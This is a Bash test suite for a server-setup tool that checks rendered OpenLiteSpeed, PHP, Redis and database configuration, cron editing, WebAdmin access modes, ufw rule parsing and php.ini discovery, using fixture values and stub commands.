D_STATIC_PATHS="/static/,/assets/"
# MSYS_NO_PATHCONV: under Git Bash, jq is a native Windows binary and MSYS rewrites any
# argument that looks like a POSIX path, so "/static/" would arrive as "C:/Program Files/...".
MSYS_NO_PATHCONV=1 lib_domain_state_json >"$STATE_DIR/domains/app.example.com/domain.json"
lib_domain_state_load app.example.com
assert_eq "a real list still round-trips" "/static/,/assets/" "$D_STATIC_PATHS"
rm -rf "$STATE_DIR/domains/app.example.com"
lib_domain_state_reset

# -- settings chosen at install time are restored for later commands ---------
# without this "panel" rebound the WebAdmin listener to the built-in 7080
lib_manifest_set '.params.admin_port' '7574'
lib_manifest_set '.params.admin_access' 'ip'
ADMIN_PORT="7080"; ADMIN_ACCESS="tunnel"
lib_params_load
assert_eq "admin port restored from the manifest" "7574" "$ADMIN_PORT"
assert_eq "admin access restored too" "ip" "$ADMIN_ACCESS"
ADMIN_PORT="7080"; ADMIN_ACCESS="tunnel"
lib_manifest_set '.params.admin_port' ''
lib_manifest_set '.params.admin_access' ''
cp "$TMP/conf.before-audit" "$LSWS_CONF"

# =============================================================================
section "profile calculation"
SYS_ANALYZED=1; SYS_RAM_MB=4096; SYS_RAM_AVAIL_MB=3000; SYS_CPU_CORES=2; SYS_DISK_TYPE=ssd; SYS_SWAP_MB=0
lib_system_profile
assert_eq "db buffer pct 4G" 40 "$CALC_DB_BUFFER_PCT"
assert_eq "db buffer mb" 1632 "$CALC_DB_BUFFER_MB"
assert_eq "db log mb" 408 "$CALC_DB_LOG_MB"
assert_eq "db max conn" 256 "$CALC_DB_MAX_CONN"
assert_eq "db io cap ssd" 1000 "$CALC_DB_IO_CAP"
assert_eq "redis mb" 327 "$CALC_REDIS_MB"
assert_eq "php memory" 256 "$CALC_PHP_MEMORY_MB"
assert_eq "opcache" 192 "$CALC_OPCACHE_MB"
assert_eq "ols workers" 2 "$CALC_OLS_WORKERS"
assert_eq "ols max conn" 5000 "$CALC_OLS_MAX_CONN"
assert_eq "no swap needed at 4G" 0 "$CALC_SWAP_MB"
assert_true "php children sane" bash -c "(( $CALC_PHP_CHILDREN_SITE >= 2 && $CALC_PHP_CHILDREN_SITE <= 8 && $CALC_PHP_CHILDREN_TOTAL >= $CALC_PHP_CHILDREN_SITE ))"
SYS_RAM_MB=1024; SYS_DISK_TYPE=nvme; lib_system_profile
assert_eq "db buffer pct 1G" 25 "$CALC_DB_BUFFER_PCT"
assert_eq "swap 1G" 2048 "$CALC_SWAP_MB"
assert_eq "io cap nvme" 2000 "$CALC_DB_IO_CAP"
assert_eq "redis min 64" 64 "$CALC_REDIS_MB"
SYS_RAM_MB=512; lib_system_profile; assert_eq "swap 512M" 1024 "$CALC_SWAP_MB"
DB_BUFFER_PERCENT=60; SYS_RAM_MB=8192; lib_system_profile
assert_eq "db pct override" 60 "$CALC_DB_BUFFER_PCT"; assert_eq "db mb override" 4912 "$CALC_DB_BUFFER_MB"
DB_BUFFER_PERCENT=""; SYS_RAM_MB=4096; SYS_DISK_TYPE=ssd; lib_system_profile
out="$(lib_db_render_tuning)"
assert_has "tuning buffer pool" "innodb_buffer_pool_size         = 1632M" "$out"
assert_has "tuning max conn" "max_connections                 = 256" "$out"
assert_has "tuning bind" "bind-address                    = 127.0.0.1" "$out"
out="$(lib_php_render_ini)"
assert_has "php ini memory" "memory_limit = 256M" "$out"
assert_has "php ini opcache" "opcache.memory_consumption = 192" "$out"
assert_has "php ini tz" "date.timezone = Europe/Istanbul" "$out"
out="$(lib_redis_render_conf secretpass 0)"
assert_has "redis pass" "requirepass secretpass" "$out"
assert_has "redis maxmemory" "maxmemory 327mb" "$out"
assert_has "redis no persistence" 'save ""' "$out"
out="$(lib_redis_render_conf secretpass 1)"
assert_has "redis persistence" "appendonly yes" "$out"
out="$(lib_system_render_sysctl)"; assert_has "sysctl header" "Managed by lompstack" "$out"
out="$(lib_system_render_limits)"; assert_has "limits nofile" "nofile  1048576" "$out"

# =============================================================================
section "vhost templates"
lib_domain_state_reset
D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"; D_HOME="$SITES_ROOT/example.com"
D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"; D_WWW=1; D_SSL=1; D_HSTS_PRELOAD=0; D_EMAIL="a@example.com"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/php.vhconf"
assert_true "php vhconf balanced" _ols_braces_balanced "$TMP/php.vhconf"
assert_has "php extprocessor" "extprocessor example_com {" "$out"
assert_has "php extUser" "extUser                 example_com" "$out"
assert_has "php post size" "post_max_size 72M" "$out"
assert_has "php sessions path" "session.save_path $SITES_ROOT/example.com/private/sessions" "$out"
assert_has "www alias" "vhAliases                 www.example.com" "$out"
assert_has "www redirect" 'RewriteCond %{HTTP_HOST} ^www\.example\.com$ [NC]' "$out"
assert_has "www redirect spares .well-known" 'RewriteCond %{HTTP_HOST} ^www\.example\.com$ [NC]
RewriteCond %{REQUEST_URI} !^/\.well-known/
RewriteRule ^(.*)$ https://example.com$1 [R=301,L]' "$out"
# ...and in the other direction: with --www-primary it is the bare name that redirects, and an
# app's association file is fetched from that name too, by a client that follows no redirect
D_WWW_PRIMARY=1; _wk="$(lib_ols_render_vhconf)"; D_WWW_PRIMARY=0
assert_has "the redirect to www spares .well-known as well" 'RewriteCond %{HTTP_HOST} ^example\.com$ [NC]
RewriteCond %{REQUEST_URI} !^/\.well-known/
RewriteRule ^(.*)$ https://www.example.com$1 [R=301,L]' "$_wk"
# (the whole line: the https redirect has a condition of its own that only begins the same way,
# for the ACME challenge)
assert_eq "once in each direction, on the www redirect and nowhere else" "1 1" \
  "$(grep -cxF 'RewriteCond %{REQUEST_URI} !^/\.well-known/' <<<"$out" || true) $(grep -cxF 'RewriteCond %{REQUEST_URI} !^/\.well-known/' <<<"$_wk" || true)"
assert_has "https redirect" 'RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]' "$out"
assert_has "hsts" "Strict-Transport-Security: max-age=31536000; includeSubDomains" "$out"
assert_lacks "no preload" "preload" "$out"
assert_has "vhssl" "vhssl  {" "$out"
assert_has "vhssl key" "keyFile                 $SSL_DEPLOY_DIR/example.com/privkey.pem" "$out"
assert_has "dotfile block" 'RewriteRule ^/?\.(?!well-known/) - [F,L]' "$out"
assert_has "acme context" "context /.well-known/acme-challenge/ {" "$out"
assert_eq "rewrite heredoc terminated" "1" "$(grep -c '^  END_rules$' "$TMP/php.vhconf")"
assert_eq "extraHeaders heredoc terminated" "1" "$(grep -c '^  END_extraHeaders$' "$TMP/php.vhconf")"
D_SSL=0; D_WWW=0; D_MODE="static"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/static.vhconf"
assert_true "static vhconf balanced" _ols_braces_balanced "$TMP/static.vhconf"
assert_lacks "static no scripthandler" "scripthandler" "$out"
assert_lacks "static no vhssl" "vhssl" "$out"
assert_lacks "static no https redirect" "https://%{HTTP_HOST}" "$out"
D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_WS_PATH="/socket.io"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/proxy.vhconf"
assert_true "proxy vhconf balanced" _ols_braces_balanced "$TMP/proxy.vhconf"
assert_has "proxy extprocessor" "extprocessor example_com_proxy {" "$out"
assert_has "proxy context" "handler                 example_com_proxy" "$out"
assert_has "proxy static ctx" "context /static/ {" "$out"
assert_has   "websocket on the proxied root" "websocket / {" "$out"
assert_lacks "no websocket context of its own (OLS would make it static)" "websocket /socket.io" "$out"
assert_has   "proxy pool closes before the app's keep-alive does" "pcKeepAliveTimeout      1" "$out"
assert_lacks "no 60 s proxy pool" "pcKeepAliveTimeout      60" "$out"
# OpenLiteSpeed 1.9.2 neither removes nor replaces a request header with these: see the note
# above the proxy extprocessor in lib_ols_render_vhconf
assert_lacks "no request header operations on a proxied site" "RequestHeader" "$out"
D_WS_PATH=""
out="$(lib_ols_render_vhconf)"
assert_has   "websockets pass without --ws-path too" "websocket / {" "$out"
D_WS_PATH="/socket.io"
D_MODE="wordpress"; D_PHP="8.3"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/wp.vhconf"
assert_true "wp vhconf balanced" _ols_braces_balanced "$TMP/wp.vhconf"
assert_has "wp cache module" "module cache {" "$out"
assert_has "wp htaccess" "autoLoadHtaccess        1" "$out"
# OpenLiteSpeed ignores the "Deny from all" security plugins put into wp-content/uploads
assert_has "wp: no PHP runs from the uploads" 'RewriteRule (?i)^/?wp-content/uploads/.*\.(php[0-9]?|phtml|phar)(/|$) - [F,L]' "$out"
assert_lacks "php sites get no WordPress paths" "wp-content/uploads" "$(cat "$TMP/php.vhconf")"
lib_ols_render_default_vhconf >"$TMP/default.vhconf"
assert_true "default vhconf balanced" _ols_braces_balanced "$TMP/default.vhconf"
lib_ols_render_vhost_block example.com 1 >"$TMP/vhblock.conf"
assert_true "vhost block balanced" _ols_braces_balanced "$TMP/vhblock.conf"
assert_has "vhost block root" "vhRoot                  $SITES_ROOT/example.com/" "$(cat "$TMP/vhblock.conf")"
lib_ssl_hook_render >"$TMP/hook.sh"
assert_true "deploy hook parses" bash -n "$TMP/hook.sh"

# =============================================================================
section "state / manifest / cron / files"
lib_state_init
assert_true "manifest valid" lib_json_valid "$STATE_DIR/manifest.json"
lib_manifest_set '.params.timezone' 'Europe/Istanbul'
assert_eq "manifest get" "Europe/Istanbul" "$(lib_manifest_get '.params.timezone')"
lib_manifest_set_json '.cloudflare.enabled' true
assert_eq "manifest json bool" "true" "$(lib_manifest_get '.cloudflare.enabled')"
assert_true "cf enabled helper" lib_cf_enabled
lib_domain_state_reset
D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"; D_HOME="$SITES_ROOT/example.com"
D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"; D_WWW=1; D_SSL_WANTED=1; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
assert_true "domain registered" lib_domain_registered example.com
lib_json_set "$(lib_domain_json example.com)" '.db = {name:"example_com", user:"example_com"}'
lib_domain_state_reset
assert_true "state load" lib_domain_state_load example.com
assert_eq "state php" "8.3" "$D_PHP"; assert_eq "state www" "1" "$D_WWW"; assert_eq "state ssl" "0" "$D_SSL"
assert_eq "state db merged" "example_com" "$D_DB_NAME"; assert_eq "state memory" "256M" "$D_MEMORY"
D_SSL=1; lib_domain_state_save; lib_domain_state_load example.com
assert_eq "state ssl saved" "1" "$D_SSL"; assert_eq "state db kept after save" "example_com" "$D_DB_NAME"
assert_eq "domains list" "example.com" "$(lib_domains_list)"
lib_cron_set healthcheck "15 6 * * * root $BIN_LINK healthcheck"
assert_true "cron has" lib_cron_has healthcheck
assert_has "cron shell header" "SHELL=/bin/bash" "$(cat "$CRON_FILE")"
lib_cron_set healthcheck "30 6 * * * root $BIN_LINK healthcheck"
assert_eq "cron replaced" "1" "$(grep -c 'server-setup:healthcheck' "$CRON_FILE")"
assert_has "cron new schedule" "30 6 * * *" "$(cat "$CRON_FILE")"
lib_cron_set "wpcron:example.com" "*/5 * * * * example_com true"
lib_cron_remove healthcheck
assert_false "cron removed" lib_cron_has healthcheck
assert_true "cron other kept" lib_cron_has "wpcron:example.com"
lib_cron_set a1 "1 * * * * root true"; lib_cron_set a2 "2 * * * * root true"; lib_cron_set a3 "3 * * * * root true"
lib_cron_set a2 "22 * * * * root true"
assert_eq  "cron: an entry is replaced where it stands" "a1 a2 a3" "$(grep -oE 'server-setup:a[0-9]$' "$CRON_FILE" | cut -d: -f2 | paste -sd' ' -)"
assert_has "cron: with its new schedule" "22 * * * * root true # server-setup:a2" "$(cat "$CRON_FILE")"
lib_cron_set a2 "22 * * * * root true"
assert_eq  "cron: setting it to what it is writes nothing" 0 "$LIB_FILE_CHANGED"
lib_cron_set a4 "4 * * * * root printf 'a\\b'"
assert_eq  "cron: a new entry goes last, backslashes as written" "4 * * * * root printf 'a\\b' # server-setup:a4" "$(tail -n 1 "$CRON_FILE")"
printf '9 * * * * root dup # server-setup:a1\n' >>"$CRON_FILE"
lib_cron_set xa1 "5 * * * * root other"
lib_cron_set a1 "11 * * * * root true"
assert_eq  "cron: a duplicate collapses into the first" 1 "$(grep -c 'server-setup:a1$' "$CRON_FILE")"
assert_has "cron: an id that only ends like another is left alone" "5 * * * * root other # server-setup:xa1" "$(cat "$CRON_FILE")"
for _c in a1 a2 a3 a4 xa1; do lib_cron_remove "$_c"; done
lib_backup_schedule "daily 03:00"
assert_has "schedule daily" "0 3 * * * root $BIN_LINK backup --all" "$(cat "$CRON_FILE")"
lib_backup_schedule "weekly sun 04:30"
assert_has "schedule weekly" "30 4 * * 0 root" "$(cat "$CRON_FILE")"
lib_backup_schedule "hourly"; assert_has "schedule hourly" "7 * * * * root" "$(cat "$CRON_FILE")"
lib_backup_schedule "15 2 * * *"; assert_has "schedule raw" "15 2 * * * root" "$(cat "$CRON_FILE")"
assert_false "schedule invalid" bash -c "$(declare -f lib_backup_schedule lib_die lib_log_write lib_mask_secrets lib_rollback_run lib_log_line_no lib_cron_set lib_manifest_set lib_ok); lib_backup_schedule bogus 2>/dev/null"
printf 'hello\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write new" 1 "$LIB_FILE_CHANGED"; assert_eq "write content" "hello" "$(cat "$TMP/wf.txt")"
printf 'hello\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write unchanged" 0 "$LIB_FILE_CHANGED"
printf 'world\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write changed" 1 "$LIB_FILE_CHANGED"; assert_eq "write content 2" "world" "$(cat "$TMP/wf.txt")"
assert_true "backup archived" bash -c "ls '$STATE_DIR'/archive/configs/*wf.txt* >/dev/null 2>&1"
OPT_DRY_RUN=1; printf 'dry\n' | lib_write_file "$TMP/wf.txt"; OPT_DRY_RUN=0
assert_eq "dry-run flagged" 1 "$LIB_FILE_CHANGED"; assert_eq "dry-run untouched" "world" "$(cat "$TMP/wf.txt")"
printf 'a = 1\n;b = 2\n' >"$TMP/kv.ini"
lib_set_kv "$TMP/kv.ini" a 5; lib_set_kv "$TMP/kv.ini" b 7; lib_set_kv "$TMP/kv.ini" c 9
assert_eq "set_kv result" "$(printf 'a = 5\nb = 7\nc = 9')" "$(cat "$TMP/kv.ini")"
lib_append_line_once "$TMP/kv.ini" "include x"; lib_append_line_once "$TMP/kv.ini" "include x"
assert_eq "append once" 1 "$(grep -c '^include x$' "$TMP/kv.ini")"
_ini_set "$TMP/nd.conf" web "bind to" "127.0.0.1"; _ini_set "$TMP/nd.conf" web "bind to" "*"; _ini_set "$TMP/nd.conf" web "allow connections from" "localhost"
assert_eq "ini set" "$(printf '[web]\n    bind to = *\n    allow connections from = localhost')" "$(cat "$TMP/nd.conf")"
lib_domain_logrotate_regen
assert_has "logrotate site path" "$SITES_LOG_ROOT/example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_lacks "and nothing in the site's home" "$SITES_ROOT/example.com/logs" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has "logrotate copytruncate" "copytruncate" "$(cat "$LOGROTATE_SITES_FILE")"
mkdir -p "$TMP/f2b"; mv_filter_dir="$TMP/f2b"
lib_domain_fail2ban_filters_write 2>/dev/null || true

# =============================================================================
section "cloudflare access control"
printf '# cf\n173.245.48.0/20\n103.21.244.0/22\n2400:cb00::/32\n' >"$CF_IPS_FILE"
lib_ols_tx_begin; lib_cf_tx_apply 1
assert_eq "cf useIpInProxyHeader" "2" "$(lib_ols_tx_top_get useIpInProxyHeader)"
assert_eq "cf allow list" "ALL, 173.245.48.0/20T, 103.21.244.0/22T, 2400:cb00::/32T" "$(lib_ols_tx_block_get accessControl "" allow)"
lib_cf_tx_apply 0
assert_eq "cf disabled header" "0" "$(lib_ols_tx_top_get useIpInProxyHeader)"
assert_eq "cf disabled allow" "ALL" "$(lib_ols_tx_block_get accessControl "" allow)"
lib_ols_tx_abort
if command -v python3 >/dev/null 2>&1; then
  assert_true  "ip in cf range" lib_ip_in_cidr_list 173.245.50.1 "$CF_IPS_FILE"
  assert_false "ip not in cf range" lib_ip_in_cidr_list 8.8.8.8 "$CF_IPS_FILE"
  assert_true  "ipv6 in cf range" lib_ip_in_cidr_list 2400:cb00::1 "$CF_IPS_FILE"
fi

# =============================================================================
section "add argument parsing"
lib_domain_parse_add_args Example.COM --www --php 8.3 --memory 512M --upload 128M --email a@b.c
assert_eq "parse domain lower" "example.com" "$D_DOMAIN"; assert_eq "parse www" 1 "$D_WWW"; assert_eq "parse memory" "512M" "$D_MEMORY"
assert_eq "parse ident" "example_com" "$D_IDENT"; assert_eq "parse home" "$SITES_ROOT/example.com" "$D_HOME"
lib_domain_parse_add_args app.example.com --proxy 127.0.0.1:3000 --ws-path /ws --no-ssl
assert_eq "parse proxy mode" "proxy" "$D_MODE"; assert_eq "parse proxy target" "127.0.0.1:3000" "$D_PROXY"; assert_eq "parse no-ssl" 0 "$D_SSL_WANTED"; assert_eq "parse proxy php cleared" "" "$D_PHP"
lib_domain_parse_add_args blog.example.com --wordpress --wp-locale tr_TR
assert_eq "parse wp mode" "wordpress" "$D_MODE"; assert_eq "parse wp db" 1 "$DOM_OPT_WITH_DB"; assert_eq "parse wp locale" "tr_TR" "$DOM_OPT_WP_LOCALE"
PARSE_FNS="$(declare -f lib_domain_parse_add_args lib_domain_state_reset lib_domain_valid lib_domain_add_usage lib_die lib_log_write lib_mask_secrets lib_rollback_run lib_log_line_no lib_php_valid_version lib_domain_ident lib_domain_home lib_iso_now)"
assert_false "parse bad memory" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args x.com --memory 256 2>/dev/null"
assert_false "parse www domain" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args www.x.com 2>/dev/null"
assert_true  "parse ok in subshell" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args ok.example.com --static 2>/dev/null"

# =============================================================================
section "WebAdmin access modes"
mkdir -p "$LSWS_HOME/admin/conf"
cat >"$LSWS_ADMIN_CONF" <<'EOF'
enableCoreDump      1
sessionTimeout      3600

accessControl {
  allow             ALL
}

listener adminListener {
  address           *:7080
  secure            0
}
EOF
SYS_IPV6=0
ADMIN_ACCESS="tunnel"; assert_eq "tunnel binds localhost" "127.0.0.1" "$(lib_ols_admin_address)"
ADMIN_ACCESS="ip";     assert_eq "ip mode binds all (v4)" "*" "$(lib_ols_admin_address)"
ADMIN_ACCESS="open";   assert_eq "open mode binds all" "*" "$(lib_ols_admin_address)"
SYS_IPV6=1; assert_eq "dual stack binds [ANY]" "[ANY]" "$(lib_ols_admin_address)"
SYS_IPV6=0; ADMIN_ACCESS="tunnel"
assert_eq "current bind read" "*:7080" "$(lib_ols_admin_current_bind)"
assert_false "not tunnel-only yet" lib_ols_admin_tunnel_only
lib_ols_admin_bind 127.0.0.1
assert_eq "bind rewritten" "127.0.0.1:7080" "$(lib_ols_admin_current_bind)"
assert_true  "tunnel-only detected" lib_ols_admin_tunnel_only
assert_eq "admin URL uses localhost" "http://127.0.0.1:7080" "$(lib_ols_admin_url)"
lib_ols_admin_bind 127.0.0.1
assert_eq "rebinding is idempotent" 0 "$LIB_FILE_CHANGED"
lib_ols_admin_bind '*'
assert_eq "bind back to all" "*:7080" "$(lib_ols_admin_current_bind)"
assert_false "no longer tunnel-only" lib_ols_admin_tunnel_only
assert_eq "admin conf still balanced" 1 "$( _ols_braces_balanced "$LSWS_ADMIN_CONF" && echo 1 || echo 0)"
assert_eq "secure flag untouched" "0" "$(_ols_block_key "$LSWS_ADMIN_CONF" listener adminListener secure get)"

SYS_SSH_PORTS="22"; SYS_PUBLIC_IPV4="198.51.100.7"; SUDO_USER="deploy"
assert_eq "tunnel command (default port)" "ssh -N -L 7080:127.0.0.1:7080 deploy@198.51.100.7" "$(lib_ols_admin_tunnel_cmd)"
SYS_SSH_PORTS="2222 22"
assert_eq "tunnel command (custom port)" "ssh -N -L 7080:127.0.0.1:7080 -p 2222 deploy@198.51.100.7" "$(lib_ols_admin_tunnel_cmd)"
unset SUDO_USER

SSH_CONNECTION="203.0.113.9 51234 10.0.0.5 22"
assert_eq "admin client ip from SSH" "203.0.113.9" "$(lib_admin_client_ip)"
SSH_CONNECTION="2001:db8::1 51234 2001:db8::2 22"
assert_eq "admin client ipv6 from SSH" "2001:db8::1" "$(lib_admin_client_ip)"
unset SSH_CONNECTION
# sudo clears the environment, so the fallbacks decide; each part is tested on its own
# because the ancestry walk depends on the machine the suite runs on.
assert_eq "who: remote IPv4"  "203.0.113.77" "$(lib_admin_ip_from_who <<<'root     pts/0        2026-09-14 17:30 (203.0.113.77)')"
assert_eq "who: remote IPv6"  "2001:db8::1"  "$(lib_admin_ip_from_who <<<'ubuntu   pts/1        2026-09-14 17:30 (2001:db8::1)')"
assert_eq "who: local console" ""            "$(lib_admin_ip_from_who <<<'root     tty1         2026-09-14 17:30')"
assert_eq "who: X display"     ":0"          "$(lib_admin_ip_from_who <<<'root     pts/0        2026-09-14 17:30 (:0)')"
assert_eq "who: no output"     ""            "$(lib_admin_ip_from_who </dev/null)"
assert_true  "valid IPv4 accepted" lib_admin_ip_valid 203.0.113.77
assert_true  "valid IPv6 accepted" lib_admin_ip_valid 2001:db8::1
assert_false "X display rejected"  lib_admin_ip_valid ':0'
assert_false "hostname rejected"   lib_admin_ip_valid 'client.example.com'
assert_false "empty rejected"      lib_admin_ip_valid ''
assert_eq "ancestry walk exits cleanly" 0 "$(run_isolated lib_admin_ip_from_ancestors)"

# ufw rule parsing must never touch a port it was not asked about
ufw() {
  [[ "$*" == "status numbered" ]] || return 0
  cat <<'EOF'
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80/tcp                     ALLOW IN    Anywhere
[ 3] 7080/tcp                   ALLOW IN    203.0.113.5
[ 4] 443/tcp                    ALLOW IN    Anywhere
[10] 7080/tcp (v6)              ALLOW IN    Anywhere (v6)
EOF
}
assert_eq "admin port rules, highest first" "$(printf '10\n3')" "$(lib_ufw_port_rule_numbers 7080)"
assert_eq "ssh port rule found" "1" "$(lib_ufw_port_rule_numbers 22)"
assert_eq "unused port has no rules" "" "$(lib_ufw_port_rule_numbers 9999)"
assert_lacks "port 80 never matched for 7080" "2" "$(lib_ufw_port_rule_numbers 7080)"
unset -f ufw

# =============================================================================
section "config test (structural)"
lib_ols_tx_begin; lib_ols_tx_vhost_add example.com 1 1; lib_ols_tx_commit
assert_eq "vhost map http" "example.com, www.example.com" "$(lib_ols_conf_map_get HTTP example.com)"
assert_false "config test fails on missing vhconf" lib_ols_config_test
assert_has "config test message" "configFile" "$OLS_TEST_OUTPUT"
mkdir -p "$LSWS_VHOSTS_DIR/example.com"; cp "$TMP/php.vhconf" "$LSWS_VHOSTS_DIR/example.com/vhconf.conf"
assert_true "config test passes" lib_ols_config_test
lib_ols_tx_begin; lib_ols_tx_vhost_remove example.com; lib_ols_tx_commit
assert_false "vhost removed from conf" lib_ols_conf_block_exists virtualhost example.com
assert_eq "maps removed" "" "$(lib_ols_conf_map_get HTTPS example.com)"

# =============================================================================
section "php.ini discovery (regression: SIGPIPE from a large phpinfo)"
mkdir -p "$TMP/fakephp/bin"
cat >"$TMP/fakephp/bin/php" <<'FAKEPHP'
#!/usr/bin/env bash
# stand-in for the LSPHP CLI; --ini is short, -i is deliberately huge
case "${1:-}" in
  --ini)
    [[ "${FAKE_NO_INI_FLAG:-0}" == "1" ]] && exit 0
    printf 'Configuration File (php.ini) Path: /fake/etc\n'
    printf 'Loaded Configuration File:         %s\n' "${FAKE_INI:-/fake/etc/php.ini}"
    printf 'Scan for additional .ini files in: %s\n' "${FAKE_SCAN:-/fake/etc/conf.d}"
    printf 'Additional .ini files parsed:      (none)\n'
    ;;
  -i)
    printf 'Loaded Configuration File => %s\n' "${FAKE_INI:-/fake/etc/php.ini}"
    printf 'Scan this dir for additional .ini files => %s\n' "${FAKE_SCAN:-/fake/etc/conf.d}"
    i=0
    while (( i < 20000 )); do
      printf 'filler %s ..........................................................\n' "$i" || exit 255
      i=$(( i + 1 ))
    done
    ;;
esac
FAKEPHP
chmod +x "$TMP/fakephp/bin/php"
lib_php_cli() { printf '%s/bin/php' "$TMP/fakephp"; }
assert_eq "ini discovery exits 0 (--ini path)" 0 "$(run_isolated lib_php_ini_paths 8.3)"
lib_php_ini_paths 8.3
assert_eq "php.ini parsed from --ini" "/fake/etc/php.ini" "$PHP_INI_FILE"
assert_eq "scan dir parsed from --ini" "/fake/etc/conf.d" "$PHP_INI_SCAN_DIR"
export FAKE_NO_INI_FLAG=1
assert_eq "ini discovery exits 0 (huge -i fallback)" 0 "$(run_isolated lib_php_ini_paths 8.3)"
lib_php_ini_paths 8.3
assert_eq "php.ini parsed from -i" "/fake/etc/php.ini" "$PHP_INI_FILE"
assert_eq "scan dir parsed from -i" "/fake/etc/conf.d" "$PHP_INI_SCAN_DIR"
unset FAKE_NO_INI_FLAG
export FAKE_SCAN="(none)"
lib_php_ini_paths 8.3
assert_eq "(none) scan dir becomes empty" "" "$PHP_INI_SCAN_DIR"
unset FAKE_SCAN
lib_php_cli() { printf '%s/bin/php' "$TMP/does-not-exist"; }
assert_eq "missing CLI exits 0" 0 "$(run_isolated lib_php_ini_paths 8.3)"
# shellcheck source=/dev/null
source "$ROOT/lib/php.sh"

# =============================================================================
section "renderers must exit 0 (pipefail safety)"
# Every renderer is used as "renderer | lib_write_file". If a renderer's last statement is a
# conditional that turns out false, the renderer exits 1 and pipefail aborts the installer.
# These run with errexit explicitly re-armed, which is how the installer executes them.
for fn in lib_system_render_sysctl lib_system_render_limits lib_db_render_tuning \
          lib_php_render_ini lib_ols_render_default_vhconf lib_ols_render_default_vhost_block \
          lib_ssl_hook_render lib_ols_admin_address; do
  assert_eq "${fn} exits 0" 0 "$(run_isolated "$fn")"
done
assert_eq "lib_ols_render_extprocessor exits 0" 0 "$(run_isolated lib_ols_render_extprocessor 8.3 4)"
assert_eq "lib_ols_render_vhost_block exits 0" 0 "$(run_isolated lib_ols_render_vhost_block example.com 1)"
assert_eq "lib_redis_render_conf (cache) exits 0" 0 "$(run_isolated lib_redis_render_conf pw 0)"
assert_eq "lib_redis_render_conf (persist) exits 0" 0 "$(run_isolated lib_redis_render_conf pw 1)"
assert_eq "lib_ols_render_vhssl exits 0" 0 "$(run_isolated lib_ols_render_vhssl /k.pem /c.pem 1)"

# the site renderer has the most branches: cover every mode with and without TLS
for _mode in php static proxy wordpress; do
  for _ssl in 0 1; do
    lib_domain_state_reset
    D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"
    D_HOME="$SITES_ROOT/example.com"; D_MODE="$_mode"; D_SSL="$_ssl"
    [[ "$_mode" == "proxy" ]] && D_PROXY="127.0.0.1:3000"
    [[ "$_mode" == "php" || "$_mode" == "wordpress" ]] && { D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4; }
    assert_eq "vhconf ${_mode} ssl=${_ssl} exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
    # and with every optional switch on at once
    D_WWW=1; D_WWW_PRIMARY=1; D_HSTS_PRELOAD=1; D_EMAIL="a@b.c"; D_WS_PATH="/ws"; D_PATH_PROXIES=$'/api/ 127.0.0.1:3001\n/ws/ 127.0.0.1:3002'
    assert_eq "vhconf ${_mode} ssl=${_ssl} (all options) exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
  done
done
lib_domain_state_reset

# =============================================================================
section "every configured path is created (regression: path is not accessible)"
# OpenLiteSpeed refuses the whole configuration when a context points at a directory that
# does not exist. This walks the rendered configuration, resolves the OLS variables and
# asserts the installer really creates every path it references.
ACME_ROOT="$TMP/acme"; OLS_CACHE_DIR="$TMP/cachedata"; OLS_DEFAULT_ROOT="$TMP/lsws/_default"
config_paths() { awk '$1=="location" || $1=="docRoot" || $1=="storagePath" {print $2}'; }

lib_ols_acme_root_ensure
lib_mkdir "${OLS_DEFAULT_ROOT}/html" 0755
missing=""
while read -r p; do
  [[ -n "$p" ]] || continue
  p="${p//'$VH_ROOT'/$OLS_DEFAULT_ROOT}"
  [[ -e "$p" ]] || missing+="${p} "
done < <(lib_ols_render_default_vhconf | config_paths)
assert_eq "catch-all vhost: every path exists" "" "$missing"

for _mode in php static proxy wordpress; do
  lib_domain_state_reset
  D_DOMAIN="paths-${_mode}.example.com"; D_IDENT="paths_${_mode}"
  D_USER="paths_user"; D_GROUP="paths_user"   # chown is stubbed out in this suite
  D_HOME="$SITES_ROOT/${D_DOMAIN}"; D_MODE="$_mode"
  [[ "$_mode" == "proxy" ]] && D_PROXY="127.0.0.1:3000"
  [[ "$_mode" == "php" || "$_mode" == "wordpress" ]] && { D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4; }
  lib_domain_dirs_create >/dev/null 2>&1
  missing=""
  while read -r p; do
    [[ -n "$p" ]] || continue
    p="${p//'$VH_ROOT'/$D_HOME}"
    p="${p//'$VH_NAME'/$D_DOMAIN}"
    [[ -e "$p" ]] || missing+="${p} "
  done < <(lib_ols_render_vhconf | config_paths)
  assert_eq "${_mode} site: every path exists" "" "$missing"
done
